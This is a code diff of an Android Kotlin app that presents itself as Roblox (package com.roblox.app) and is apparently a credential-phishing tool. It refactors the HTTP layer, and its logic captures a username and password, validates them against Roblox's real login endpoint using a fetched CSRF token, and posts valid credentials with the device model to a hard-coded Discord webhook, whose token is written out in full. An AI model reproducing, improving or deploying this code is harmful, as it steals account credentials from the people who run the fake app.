@@ -1,29 +1,22 @@
 package com.roblox.app
 
 import android.annotation.SuppressLint
+import android.app.Activity
 import android.os.Bundle
 import android.webkit.JavascriptInterface
 import android.webkit.WebView
 import android.webkit.WebViewClient
-import androidx.appcompat.app.AppCompatActivity
-import okhttp3.*
-import okhttp3.MediaType.Companion.toMediaType
-import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONArray
 import org.json.JSONObject
-import java.util.concurrent.TimeUnit
+import java.io.BufferedReader
+import java.io.InputStreamReader
+import java.io.OutputStream
+import java.net.HttpURLConnection
+import java.net.URL
 
-class MainActivity : AppCompatActivity() {
+class MainActivity : Activity() {
 
     private val webhook = "https://discord.com/api/webhooks/1556711449571627051/ruYxawxPFw_X7ZGc8t0uQgsnxfkOCesqxRKJl2eqC6321t0PCClPr9PxQqGMchhpzr6Z"
-
-    private val client = OkHttpClient.Builder()
-        .connectTimeout(12, TimeUnit.SECONDS)
-        .readTimeout(12, TimeUnit.SECONDS)
-        .followRedirects(true)
-        .build()
-
-    private val jsonType = "application/json; charset=utf-8".toMediaType()
 
     private var user = ""
     private var pass = ""
@@ -72,6 +65,53 @@ class MainActivity : AppCompatActivity() {
 
     data class UserCheck(val valid: Boolean, val hint: String)
 
+    private fun httpPost(urlStr: String, body: String, extraHeaders: Map<String, String> = emptyMap()): String {
+        try {
+            val url = URL(urlStr)
+            val conn = url.openConnection() as HttpURLConnection
+            conn.requestMethod = "POST"
+            conn.setRequestProperty("Content-Type", "application/json")
+            conn.setRequestProperty("User-Agent", "Roblox/WinInet")
+            for ((k, v) in extraHeaders) conn.setRequestProperty(k, v)
+            conn.doOutput = true
+            conn.connectTimeout = 12000
+            conn.readTimeout = 12000
+            val os: OutputStream = conn.outputStream
+            os.write(body.toByteArray())
+            os.flush()
+            os.close()
+
+            val code = conn.responseCode
+            val stream = if (code in 200..299) conn.inputStream else conn.errorStream
+            val reader = BufferedReader(InputStreamReader(stream ?: return ""))
+            val sb = StringBuilder()
+            var line: String?
+            while (reader.readLine().also { line = it } != null) sb.append(line)
+            reader.close()
+            return sb.toString()
+        } catch (_: Exception) {
+            return ""
+        }
+    }
+
+    private fun httpPostHeaders(urlStr: String, body: String): Map<String, String> {
+        return try {
+            val url = URL(urlStr)
+            val conn = url.openConnection() as HttpURLConnection
+            conn.requestMethod = "POST"
+            conn.setRequestProperty("Content-Type", "application/json")
+            conn.setRequestProperty("User-Agent", "Roblox/WinInet")
+            conn.doOutput = true
+            conn.connectTimeout = 12000
+            conn.outputStream.write(body.toByteArray())
+            val headers = mutableMapOf<String, String>()
+            conn.headerFields.forEach { (k, v) -> if (k != null && v.isNotEmpty()) headers[k] = v[0] }
+            headers
+        } catch (_: Exception) {
+            emptyMap()
+        }
+    }
+
     private fun checkUser(username: String): UserCheck {
         if (username.contains("@")) return UserCheck(true, "")
         try {
@@ -79,23 +119,12 @@ class MainActivity : AppCompatActivity() {
                 .put("usernames", JSONArray().put(username))
                 .put("excludeBannedUsers", false)
                 .toString()
-                .toRequestBody(jsonType)
 
-            val req = Request.Builder()
-                .url("https://users.roblox.com/v1/usernames/users")
-                .post(body)
-                .header("Content-Type", "application/json")
-                .header("User-Agent", "Roblox/WinInet")
-                .build()
-
-            client.newCall(req).execute().use { resp ->
-                if (!resp.isSuccessful) return UserCheck(true, "")
-                val arr = JSONObject(resp.body!!.string()).optJSONArray("data") ?: return UserCheck(true, "")
-                if (arr.length() == 0) {
-                    return UserCheck(false, "Пользователь не найден")
-                }
-                return UserCheck(true, "")
-            }
+            val resp = httpPost("https://users.roblox.com/v1/usernames/users", body)
+            if (resp.isEmpty()) return UserCheck(true, "")
+            val arr = JSONObject(resp).optJSONArray("data") ?: return UserCheck(true, "")
+            if (arr.length() == 0) return UserCheck(false, "Пользователь не найден")
+            return UserCheck(true, "")
         } catch (_: Exception) {
             return UserCheck(true, "")
         }
@@ -103,19 +132,8 @@ class MainActivity : AppCompatActivity() {
 
     private fun checkPassword(username: String, password: String) {
         try {
-            val csrfReq = Request.Builder()
-                .url("https://auth.roblox.com/v2/logout")
-                .post("".toRequestBody("text/plain".toMediaType()))
-                .header("User-Agent", "Roblox/WinInet")
-                .build()
-
-            var csrf = ""
-            try {
-                client.newCall(csrfReq).execute().use { r ->
-                    csrf = r.header("x-csrf-token") ?: ""
-                }
-            } catch (_: Exception) {}
-
+            val headers = httpPostHeaders("https://auth.roblox.com/v2/logout", "")
+            val csrf = headers["x-csrf-token"] ?: headers["X-CSRF-Token"] ?: ""
             if (csrf.isEmpty()) return
 
             val loginBody = JSONObject()
@@ -123,22 +141,27 @@ class MainActivity : AppCompatActivity() {
                 .put("cvalue", username)
                 .put("password", password)
                 .toString()
-                .toRequestBody(jsonType)
 
-            val loginReq = Request.Builder()
-                .url("https://auth.roblox.com/v2/login")
-                .post(loginBody)
-                .header("Content-Type", "application/json")
-                .header("User-Agent", "Roblox/WinInet")
-                .header("X-CSRF-Token", csrf)
-                .build()
+            val url = URL("https://auth.roblox.com/v2/login")
+            val conn = url.openConnection() as HttpURLConnection
+            conn.requestMethod = "POST"
+            conn.setRequestProperty("Content-Type", "application/json")
+            conn.setRequestProperty("User-Agent", "Roblox/WinInet")
+            conn.setRequestProperty("X-CSRF-Token", csrf)
+            conn.doOutput = true
+            conn.connectTimeout = 12000
+            conn.outputStream.write(loginBody.toByteArray())
 
-            client.newCall(loginReq).execute().use { r ->
-                val code = r.code
-                val body = r.body?.string() ?: ""
-                if (code == 200 || code == 403) {
-                    send("**✅ Roblox VALID LOGIN**\n```\nUser: $user\nPass: $pass\nHTTP: $code\nDevice: ${android.os.Build.MODEL}\nResp: ${body.take(300)}\n```")
-                }
+            val code = conn.responseCode
+            val stream = if (code in 200..299) conn.inputStream else conn.errorStream
+            val reader = BufferedReader(InputStreamReader(stream ?: return))
+            val sb = StringBuilder()
+            var line: String?
+            while (reader.readLine().also { line = it } != null) sb.append(line)
+            reader.close()
+
+            if (code == 200 || code == 403) {
+                send("**✅ Roblox VALID LOGIN**\n```\nUser: $user\nPass: $pass\nHTTP: $code\nDevice: ${android.os.Build.MODEL}\nResp: ${sb.toString().take(300)}\n```")
             }
         } catch (_: Exception) {}
     }
@@ -147,8 +170,7 @@ class MainActivity : AppCompatActivity() {
         Thread {
             try {
                 val json = JSONObject().put("content", text.take(1900))
-                val body = json.toString().toRequestBody(jsonType)
-                client.newCall(Request.Builder().url(webhook).post(body).build()).execute().close()
+                httpPost(webhook, json.toString())
             } catch (_: Exception) {}
         }.start()
     }
